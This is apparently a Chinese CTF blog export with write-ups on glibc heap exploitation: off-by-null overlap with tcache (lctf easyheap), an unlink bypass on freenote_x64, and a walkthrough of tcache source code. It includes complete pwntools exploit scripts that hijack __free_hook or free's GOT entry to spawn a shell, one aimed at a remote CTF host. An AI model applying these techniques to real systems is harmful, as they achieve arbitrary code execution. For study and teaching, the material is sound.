分配完后利用 off by null# shrink unsorted bin 的大小add(0x38, "B" * 0x30 + p64(0x120)) 下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin 123456# 构造 smallbin 为 合并时的 unlink 做准备add(0x38, "C" * 0x30 + p32(0x40) + '\n') # 4add(0x38, "P" * 0x30 + '\n') # 5free(4)# 触发堆合并，形成 smallbinsla("Choice:", "1" * 0x500) 然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin 123# 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlapfree(10)sla("Choice:", "1" * 0x500) 此时的内存布局如下图 通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap. 下面新建 3 个 chunk 123add(0x38, "DDD\n") # 4add(0x38, "KKK\n") # 6add(0x38, "EEE\n") # 7 由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。 分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc Tcache下的利用这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache 题目地址:https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap 题目分析程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。 利用分析由于有 tcache 的存在利用 off by null 基本不可能，所以 off by null 要想办法去溢出 非 tcache bin 和 fastbin . 每个 tcache 最多 7 个 chunk , 所以可以先填满 7 个 chunk 到 tcache 后续的 chunk 就会进入 unsorted bin 里面了。 首先分配 10 个 chunk , 释放掉后面 7 个这7 个进入 tcache , 然后释放 前面 3 个，这3 个会进入 unsorted bin , 这个过程会在 chunk 2 的 pre_size 写入 0x200. 123456789101112131415for i in range(10): malloc(1, str(i))# 首先释放后面的 chunk 填满 tcahefor i in range(3, 10): free(i)# 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted binfree(0)# chunk 1 的 pre_size 为 0x100free(1)# chunk 2 的 pre_size 为 0x200free(2) 此时的内存布局为 接下来利用 off by null 构造 overlap chunk 1234567891011121314151617# chunk 7 进入 unsorted binfree(7)# 此时的分配会从 tcache 里面拿 chunkmalloc(1, '0')# 再次 free chunk 8, 此时 tcache 没满，进入 tcachefree(8)# 这时分配到的是 chunk 8 位于索引 1# 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0malloc(0xf8, '1')# free 0 填充 tcachefree(0)# 释放 chunk 9 ，触发堆合并，形成 overlap chunkfree(9) 首先 释放 chunk 7 , 它会进入 unsorted bin， 设它为 C . 然后分配一个 chunk 0, 消耗一个 tcache, 为后面做准备。 然后释放 chunk 8 , 此时 tcache 还有一个空位，会进入 tcache 设它为 B. 再次分配 chunk ,此时会再次拿到 刚刚释放的 B ,保存在 索引 1 （以后称它为 chunk 1）的位置， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0 然后释放 chunk 9 , 由于 pre_size 和 pre_inused ，系统会找到 C , 然后把 C unlink , 由于此时 C 在 unsorted bin 链表上，会 正常 unlink , 之后形成一个 0x300 的 unsorted bin , 里面包含了 还在使用状态的 B 下面利用 unsorted bin 的切割机制，让指针落入 chunk 1 ， 然后利用 Puts 打印出来， leak libc 123456# 把剩下的 tcache 里面的 bin 消耗掉for i in range(7): malloc(8, &apos;/bin/sh&apos;)# 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leakmalloc(1, &apos;8&apos;) 首先把 tcache 使用掉，然后分配一个 chunk ,此时 chunk 1 会变成 unsorted bin 的起始地址。 然后打印 chunk 1 的内容，拿到 libc 的地址。123leak = puts(1)libc.address = leak - libc.symbols['__malloc_hook'] - 0x70info("libc.address : " + hex(libc.address)) 下面利用 tcache 的机制, 让两个 一样的 bin 链入 tcache ，为后续做准备。 1234567# 分配到 chunk 1, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunkmalloc(1, '9')# 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。free(0) # 为了给后续申请腾出空间free(1)free(9) 首先分配一 个 chunk , 这时 索引 1， 9 指向同一个 chunk，设这个 chunk 的名称为 A。 然后连续释放 1 和 9 ， 此时 tcache 里面会有两个 A . 然后在通过修改 tcache 的指针实现分配到 __free_hook, 修改 free_hook 为 one_gadget 123456789# 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hookmalloc(8, p64(free_hook))# 再次分配到 Amalloc(8, p64(free_hook))# 分配到 free_hook, 然后修改 free_hook 为 systemmalloc(8, p64(one_gadget)) 最后触发 free , 调用 one_gadget ，拿到 shell. 完整exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#!/usr/bin/python# -*- coding: UTF-8 -*-from pwn import *from time import sleepfrom utils import *context.log_level = "debug"context.terminal = ['tmux', 'splitw', '-h']# context.terminal = ['tmux', 'splitw', '-v']path = "easy_heap"libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")bin = ELF(path)p = process(path, aslr=0)def malloc(size, data): p.sendlineafter('command?', '1') p.sendlineafter('size', str(size)) p.sendlineafter('content', data)def free(idx): p.sendlineafter('command?', '2') p.sendlineafter('index', str(idx))def puts(idx): p.sendlineafter('command?', '3') p.sendlineafter('index', str(idx)) p.recvuntil('&gt; ') return u64((p.recvline()[:-1]).ljust(8, '\0'))for i in range(10): malloc(1, str(i))# 首先释放后面的 chunk 填满 tcahefor i in range(3, 10): free(i)# 然后释放前面的 3 个， 这三个会形成一个 0x300 的 unsorted binfree(0)# chunk 1 的 pre_size 为 0x100free(1)# chunk 2 的 pre_size 为 0x200free(2)# 使用 tcache 分配for i in range(7): malloc(1, str(i))# 分配 unsorted binmalloc(1, '7')malloc(1, '8')malloc(1, '9')# 再次让 chunk 回到 tcachefor i in range(7): free(i)# chunk 7 进入 unsorted binfree(7)# 此时的分配会从 tcache 里面拿 chunkmalloc(1, '0')# 再次 free chunk 8, 此时 tcache 没满，进入 tcachefree(8)# 这时分配到的是 chunk 8 位于索引 1# 因为 chunk 是 tcache 的第一项， 然后利用 off by null 修改 chunk 9 的 pre_inused = 0malloc(0xf8, '1')# free 0 填充 tcachefree(0)# 释放 chunk 9 ，触发堆合并，形成 overlap chunkfree(9)# 把剩下的 tcache 里面的 bin 消耗掉for i in range(7): malloc(8, '/bin/sh')# 分配一个chunk 此时 索引 1 的 chunk 指向 unsorted bin , leakmalloc(1, '8')leak = puts(1)libc.address = leak - libc.symbols['__malloc_hook'] - 0x70info("libc.address : " + hex(libc.address))# 分配到 chunk 8, 此时 索引为 9， 现在 索引 1， 9 指向同一个 chunkmalloc(1, '9')# 此时 tcache 中为两个 一样的 chunk 链在了一起, 设这个 chunk 的名称为 A。free(0)free(1)free(9)free_hook = libc.symbols['__free_hook']one_gadget = libc.address + 0xe42ee# 分配到 tcache中的第一个 A ，此时 A 还位于 tcache, 然后修改 A-&gt;fd 为 free_hookmalloc(8, p64(free_hook))gdb.attach(p)pause()# 再次分配到 Amalloc(8, p64(free_hook))# 分配到 free_hook, 然后修改 free_hook 为 systemmalloc(8, p64(one_gadget))# 触发 free_hookfree(2)p.interactive() 参考https://www.cnblogs.com/hac425/p/9993716.htmlhttps://github.com/veritas501/hctf2018/blob/master/pwn-heapstorm_zero/exp.pyhttps://xz.aliyun.com/t/3253#toc-2]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlink]]></title>
    <url>%2F2020%2F02%2F27%2Funlink%2F</url>
    <content type="text"><![CDATA[简介unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;smallbin的数据结构：prev_size,size,fd,bk;因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；主要检查fd,bk等指针：123// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, "corrupted double-linked list", P, AV); 在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致： 12if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr ("corrupted size vs. prev_size"); unlink操作的简要代码： 1234567891011121314#define unlink(P, BK, FD)&#123; FD = P-&gt;fd; BK = P-&gt;bk; if(FD-&gt;bk != P || BK-&gt;fd !=p) &#123; malloc_printerr (check_action, "corrupted d...", P); &#125; else &#123; FD-&gt;bk = BK; BK-&gt;fd = FD; &#125;&#125; 绕过方法实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件： 有一个指向heap内的指针； 存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)； 可以对这个指针进行多次写入； 然后我们想办法修改p的fd和p的bk分别为: 123456//64位p-&gt;fd = &amp;p - 0x18; //fdp-&gt;bk = &amp;p - 0x10; //bk//32位p-&gt;fd = &amp;p - 12; //fdp-&gt;bk = &amp;p - 8; //bk 这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到： 1234//64位p = &amp;p - 0x18；//32位p = &amp;p - 12; 例子我们以JarvisOJ中的freenote_x64来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；主要漏洞在delete note里： 1234567891011121314151617181920212223242526void __cdecl delete()&#123; int i; // [sp+Ch] [bp-4h]@2 if ( chunk_list-&gt;number &lt;= 0 ) &#123; puts("No posts yet."); &#125; else &#123; printf("Post number: "); i = get_num(); if ( i &gt;= 0 &amp;&amp; i &lt; chunk_list-&gt;sum ) // 未检查inuse位，double_free &#123; --chunk_list-&gt;number; chunk_list-&gt;block[i].in_use = 0LL; chunk_list-&gt;block[i].len = 0LL; free(chunk_list-&gt;block[i].ptr); // 指针未清空 puts("Done."); &#125; else &#123; puts("Invalid number!"); &#125; &#125;&#125; 还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余； 思路所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;在heap基地址偏移0x30的地方有我们需要的&amp;p:1234567891011pwndbg&gt; x/20gx 0x6030000x603000: 0x0000000000000000 0x00000000000018210x603010: 0x0000000000000100 0x00000000000000040x603020: 0x0000000000000001 0x00000000000000040x603030:&amp;p 0x0000000000604830 p 0x00000000000000010x603040: 0x0000000000000002 0x00000000006048c00x603050: 0x0000000000000001 0x00000000000000010x603060: 0x0000000000604950 0x00000000000000010x603070: 0x0000000000000004 0x00000000006049e00x603080: 0x0000000000000000 0x00000000000000000x603090: 0x0000000000000000 0x0000000000000000 有了&amp;p之后我们就可以构造chunk，然后unlink了；unlink之后的&amp;p,此时p=&amp;p-0x18: 1234567891011pwndbg&gt; x/20gx 0x6030000x603000: 0x0000000000000000 0x00000000000018210x603010: 0x0000000000000100 0x00000000000000040x603020: 0x0000000000000000 0x00000000000000000x603030: 0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x180x603040: 0x0000000000000008 0x00000000006048c00x603050: 0x0000000000000001 0x00000000000000010x603060: 0x0000000000604950 0x00000000000000010x603070: 0x0000000000000004 0x00000000006049e00x603080: 0x0000000000000000 0x00000000000000000x603090: 0x0000000000000000 0x0000000000000000 然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了； 具体思路伪造的如下三个堆块结构 ，注意chunk前后的size一定要相对应12345678910111213141516171819202122232425262728293031323334353637pwndbg&gt; x/80xg 0x17b88200x17b8820: 0x0000000000000000 0x00000000000001910x17b8830: 0x0000000000000090 0x00000000000000810x17b8840: 0x00000000017b7018 0x00000000017b70200x17b8850: 0x6161616161616161 0x61616161616161610x17b8860: 0x6161616161616161 0x61616161616161610x17b8870: 0x6161616161616161 0x61616161616161610x17b8880: 0x6161616161616161 0x61616161616161610x17b8890: 0x6161616161616161 0x61616161616161610x17b88a0: 0x6161616161616161 0x61616161616161610x17b88b0: 0x0000000000000080 0x00000000000000900x17b88c0: 0x6363636363636363 0x63636363636363630x17b88d0: 0x6363636363636363 0x63636363636363630x17b88e0: 0x6363636363636363 0x63636363636363630x17b88f0: 0x6363636363636363 0x63636363636363630x17b8900: 0x6363636363636363 0x63636363636363630x17b8910: 0x6363636363636363 0x63636363636363630x17b8920: 0x6363636363636363 0x63636363636363630x17b8930: 0x6363636363636363 0x63636363636363630x17b8940: 0x0000000000000090 0x00000000000001210x17b8950: 0x3232323232323232 0x00007f61721feb780x17b8960: 0x6363636363636363 0x63636363636363630x17b8970: 0x6363636363636363 0x63636363636363630x17b8980: 0x6363636363636363 0x63636363636363630x17b8990: 0x6363636363636363 0x63636363636363630x17b89a0: 0x6363636363636363 0x63636363636363630x17b89b0: 0x6363636363636363 0x00000000000206510x17b89c0: 0x6363636363636363 0x63636363636363630x17b89d0: 0x0000000000000120 0x00000000000000900x17b89e0: 0x6464646464646464 0x64646464646464640x17b89f0: 0x6464646464646464 0x64646464646464640x17b8a00: 0x6464646464646464 0x64646464646464640x17b8a10: 0x6464646464646464 0x64646464646464640x17b8a20: 0x6464646464646464 0x64646464646464640x17b8a30: 0x6464646464646464 0x64646464646464640x17b8a40: 0x6464646464646464 0x64646464646464640x17b8a50: 0x6464646464646464 0x6464646464646464 free(1)之后，堆块的结构12345678910111213141516171819202122232425262728293031323334353637pwndbg&gt; x/80xg 0x11dd8200x11dd820: 0x0000000000000000 0x00000000000001910x11dd830: 0x0000000000000090 0x00000000000001110x11dd840: 0x00007fc6bdb86b78 0x00007fc6bdb86b780x11dd850: 0x6161616161616161 0x61616161616161610x11dd860: 0x6161616161616161 0x61616161616161610x11dd870: 0x6161616161616161 0x61616161616161610x11dd880: 0x6161616161616161 0x61616161616161610x11dd890: 0x6161616161616161 0x61616161616161610x11dd8a0: 0x6161616161616161 0x61616161616161610x11dd8b0: 0x0000000000000080 0x00000000000000900x11dd8c0: 0x6363636363636363 0x63636363636363630x11dd8d0: 0x6363636363636363 0x63636363636363630x11dd8e0: 0x6363636363636363 0x63636363636363630x11dd8f0: 0x6363636363636363 0x63636363636363630x11dd900: 0x6363636363636363 0x63636363636363630x11dd910: 0x6363636363636363 0x63636363636363630x11dd920: 0x6363636363636363 0x63636363636363630x11dd930: 0x6363636363636363 0x63636363636363630x11dd940: 0x0000000000000110 0x00000000000001200x11dd950: 0x3232323232323232 0x00007fc6bdb86b780x11dd960: 0x6363636363636363 0x63636363636363630x11dd970: 0x6363636363636363 0x63636363636363630x11dd980: 0x6363636363636363 0x63636363636363630x11dd990: 0x6363636363636363 0x63636363636363630x11dd9a0: 0x6363636363636363 0x63636363636363630x11dd9b0: 0x6363636363636363 0x00000000000206510x11dd9c0: 0x6363636363636363 0x63636363636363630x11dd9d0: 0x0000000000000120 0x00000000000000900x11dd9e0: 0x6464646464646464 0x64646464646464640x11dd9f0: 0x6464646464646464 0x64646464646464640x11dda00: 0x6464646464646464 0x64646464646464640x11dda10: 0x6464646464646464 0x64646464646464640x11dda20: 0x6464646464646464 0x64646464646464640x11dda30: 0x6464646464646464 0x64646464646464640x11dda40: 0x6464646464646464 0x64646464646464640x11dda50: 0x6464646464646464 0x6464646464646464 而目标地址已经被修改为 p=&amp;p-0x18123456789101112131415161718192021pwndbg&gt; x/40xg 0x11dc0000x11dc000: 0x0000000000000000 0x00000000000018210x11dc010: 0x0000000000000100 0x00000000000000000x11dc020: 0x0000000000000001 0x00000000000001200x11dc030: 0x00000000011dc018 0x0000000000000000 //p=&amp;p-0x180x11dc040: 0x0000000000000000 0x00000000011dd8c00x11dc050: 0x0000000000000000 0x00000000000000000x11dc060: 0x00000000011dd950 0x00000000000000000x11dc070: 0x0000000000000000 0x00000000011dd9e00x11dc080: 0x0000000000000000 0x00000000000000000x11dc090: 0x0000000000000000 0x00000000000000000x11dc0a0: 0x0000000000000000 0x00000000000000000x11dc0b0: 0x0000000000000000 0x00000000000000000x11dc0c0: 0x0000000000000000 0x00000000000000000x11dc0d0: 0x0000000000000000 0x00000000000000000x11dc0e0: 0x0000000000000000 0x00000000000000000x11dc0f0: 0x0000000000000000 0x00000000000000000x11dc100: 0x0000000000000000 0x00000000000000000x11dc110: 0x0000000000000000 0x00000000000000000x11dc120: 0x0000000000000000 0x00000000000000000x11dc130: 0x0000000000000000 0x0000000000000000 接下来向 chunk0 里面写内容就相当于控制了chunk list，随便修改东西，这里把free_got覆盖为system exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = 'debug'if sys.argv[1]=="l": p=process('./freenote_x64') libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p=remote('node3.buuoj.cn',29050) libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')e=ELF('./freenote_x64')def List(): p.recvuntil('Your choice: ') p.sendline('1')def new(cont): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def edit(num,cont): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Note number: ') p.sendline(str(num)) p.recvuntil('Length of note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def delete(num): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(num))new('a'*0x80)new('b'*0x80)new('c'*0x80)new('d'*0x80)delete(0)delete(2)new('11111111')new('22222222')List()p.recvuntil('11111111')s=p.recvuntil('\x0a')chunk2=u64(s[:-1].ljust(8,'\x00'))heap_addr=chunk2-0x1940point_chunk0=heap_addr+0x30print hex(heap_addr)delete(1)delete(2)delete(3)#unlinkpayload = p64(0x90)+p64(0x81)+p64(point_chunk0-0x18)+p64(point_chunk0-0x10) payload +='a'*0x60payload += p64(0x80)+p64(0x90)payload +='c'*0x80+p64(0x90)+p64(0x121)edit(0,payload)delete(1)#free_got-&gt;systemfree_got_addr=e.got['free']print hex(free_got_addr)payload2=p64(4)+p64(1)+p64(0x8)+p64(free_got_addr)payload2+=p64(1)+p64(0x8)+p64(chunk2)payload2+=p64(1)+p64(0x8)+p64(e.got['atoi'])payload2+='\x00'*(0x120-80)edit(0,payload2)p.recvuntil('Your choice: Invalid!\n')List()p.recvuntil('2. ')atoi_in_server=u64(p.recvuntil('\x0a')[:-1].ljust(8,'\x00'))system_in_server=libc.symbols['system']+atoi_in_server-libc.symbols['atoi']#gdb.attach(proc.pidof(p)[0])payload3=p64(system_in_server)edit(0,payload3)edit(1,"/bin/sh\x00")delete(1)p.interactive() 参考链接：https://blog.csdn.net/qq_40827990/java/article/details/88090810]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache机制]]></title>
    <url>%2F2020%2F02%2F27%2Ftcache%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[前言glibc 2.26 开始引入了 tcache , 相关的 commit 可以看https://sourceware.org/git/p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc 。加入 tcache 对性能有比较大的提升，不过由于 tcache 的存在 ，一些利用方式的限制条件就少了许多。具体往下看。 相关文件位于 https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache 源码分析首先分析分析源码，看看 tcache 的工作原理 相关数据结构1234567891011typedef struct tcache_entry&#123; struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct&#123; char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64&#125; tcache_perthread_struct; tcache 也是使用 类似 bins 方式来管理tcache 。 tcache_perthread_struct 是整个tcache 每一项由 相同大小的 chunk 通过 tcache_entry 使用单向链表链接（类似于fastbin的链接方式）。 counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。 tcache_entry 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk. 基本操作下面通过分析对 tcache 的两个基本操作理解上面结构体的作用 1234567891011121314151617181920static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; // 增加到链表头部 ++(tcache-&gt;counts[tc_idx]); // 记录当前 bin 的 chunk数&#125;static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); return (void *) e;&#125; tcache_put用于把一个 chunk 放到 指定的 tcache-&gt;entries 里面去， tc_idx 通过 csize2tidx (nb) 计算得到 （nb是 chunk 的大小）。 它首先把 chunk+2*SIZE_SZ （就是除去 header 部分） 强制转换成 tcache_entry * 类型，然后插入到 tcache-&gt;entries[tc_idx] 的首部，最后把 tcache-&gt;counts[tc_idx] 加 1 ，表示新增了一个 chunk 到 该 表项。 tcache_get根据 tc_idx 取出 tcache-&gt;entries[tc_idx] 的第一个chunk ， 然后把 指针强制转换为 (void *) 这样就可以大概得到一个图 tcache-&gt;entries 的每一项通过 单向链表链接 chunk 。 tcache_entry 和 malloc chunk 是重叠的， tcache_entry-&gt;next 和 chunk-&gt;fd 是一个位置。 tcache in malloc__libc_mallocmalloc 的入口点是 __libc_malloc （做了一些注释） 12345678910111213141516171819202122232425262728293031__libc_malloc (size_t bytes)&#123;.......................................#if USE_TCACHE /* int_free also calls request2size, be careful to not pad twice. */ size_t tbytes; checked_request2size (bytes, tbytes); // tbytes 为 bytes请求的 转换后得到的 chunk 的 size size_t tc_idx = csize2tidx (tbytes); // 根据大小 tbytes ， 找到 tcache-&gt;entries 索引 MAYBE_INIT_TCACHE (); DIAG_PUSH_NEEDS_COMMENT; if (tc_idx &lt; mp_.tcache_bins /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回 &#123; return tcache_get (tc_idx); // 调用 tcache_get 拿到 chunk 然后返回 &#125; DIAG_POP_NEEDS_COMMENT;#endif if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); 首先判断 tcache-&gt;entries[tc_idx] 里面有没有 chunk ，如果有就直接返回，否则进入 _int_malloc 分配内存。 下面看看 _int_malloc （主要看 tcache 处理的部分） _int_malloc处理fastbin首先是把 请求的 size 转换成 实际 malloc 内部的 size ，然后定义了一个宏 12345678910// 从 fastbin里面移除 pp#define REMOVE_FB(fb, victim, pp) \ do \ &#123; \ victim = pp; \ if (victim == NULL) \ break; \ &#125; \ while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \ != victim); 用于多线程的中从 fastbin 里面移除一个 chunk. 然后进入分配的流程， 首先如果 size 在 fastbin 的范围内进入， fastbin 分配的流程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123; idx = fastbin_index (nb); mfastbinptr *fb = &amp;fastbin (av, idx); mchunkptr pp; victim = *fb; if (victim != NULL) &#123; if (SINGLE_THREAD_P) *fb = victim-&gt;fd; else REMOVE_FB (fb, pp, victim); if (__glibc_likely (victim != NULL)) &#123; size_t victim_idx = fastbin_index (chunksize (victim)); if (__builtin_expect (victim_idx != idx, 0)) malloc_printerr ("malloc(): memory corruption (fast)"); check_remalloced_chunk (av, victim, nb);#if USE_TCACHE size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) // 把该 fastbin 里面其他的 bin 放到 tcache 里面 &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count // 判断 tcache 中指定 bin 中 chunk 是否超过 7 &amp;&amp; (tc_victim = *fb) != NULL) &#123; if (SINGLE_THREAD_P) *fb = tc_victim-&gt;fd; else &#123; REMOVE_FB (fb, pp, tc_victim); if (__glibc_unlikely (tc_victim == NULL)) break; &#125; tcache_put (tc_victim, tc_idx); &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; 在 相应 fastbin 找到 合适的 chunk 后，就把 该 chunk 从 fastbin 里面拿下来 然后 把相应 fastbin 里面剩下的 chunk 全都放到 tcache 里面 ， 直到 tcache-&gt;entries[tc_idx] 满了 (已经有 7 个 chunk 了，即 tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7 ）。 最后在返回一开始拿到的 chunk 给用户 如果 fastbin 不能分配，则进入 smallbin 的分配流程 处理 smallbin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim)) malloc_printerr ("malloc(): smallbin double linked list corrupted"); set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; // 找到 chunk ， 从 smallbin拿下来准备返回给用户 if (av != &amp;main_arena) set_non_main_arena (victim); check_malloced_chunk (av, victim, nb);#if USE_TCACHE /* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面 stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin) &#123; if (tc_victim != 0) &#123; bck = tc_victim-&gt;bk; set_inuse_bit_at_offset (tc_victim, nb); if (av != &amp;main_arena) set_non_main_arena (tc_victim); bin-&gt;bk = bck; bck-&gt;fd = bin; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125;#endif void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; 和 fastbin 是类似的操作， 在 size 对应的 smallbin 里面找到 chunk 后 把这个 chunk 从链表上取下来 然后把该 smallbin 里面剩下的 bin 放入到 tcache ， 直到 tcache-&gt;entries[tc_idx] 满. 如果 smallbin 也没能分配，进入 unsorted bin 遍历unsorted bin123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960 int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) &#123; .................... .................... .................... /* remove from unsorted list */ unsorted_chunks (av)-&gt;bk = bck; bck-&gt;fd = unsorted_chunks (av); // 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache #if USE_TCACHE // 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历 We may return one of these chunks later. */ if (tcache_nb &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) &#123; tcache_put (victim, tc_idx); return_cached = 1; continue; &#125; else &#123;#endif check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p;#if USE_TCACHE &#125;#endif &#125; //大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。 ....................................... ....................................... .......................................#if USE_TCACHE //如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 ++tcache_unsorted_count; if (return_cached &amp;&amp; mp_.tcache_unsorted_limit &gt; 0 &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit) &#123; return tcache_get (tc_idx); &#125;#endif ....................................... ....................................... ....................................... &#125; // end of while ((victim = unsorted_chunks (av)-&gt;b//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk#if USE_TCACHE /* If all the small chunks we found ended up cached, return one now. */ if (return_cached) &#123; return tcache_get (tc_idx); &#125;#endif 在遍历 unsorted bin 的时候， 如果找到大小刚好满足的 bin ， 不会立刻返回，而是把这个 bin 放入 tcache 里面，并且设置 return_cached=1 ，表示 有 大小适配的 unsorted bin 进入了 tcache 如果大小不是正好满足需要，就走一般的流程，把 bin 放到相应的 smallbin 或者 largebin 里面 遍历 unsorted bin 的最后，会根据 return_cached 判断是否有 大小适配的 unsorted bin 进入了 tcache ， 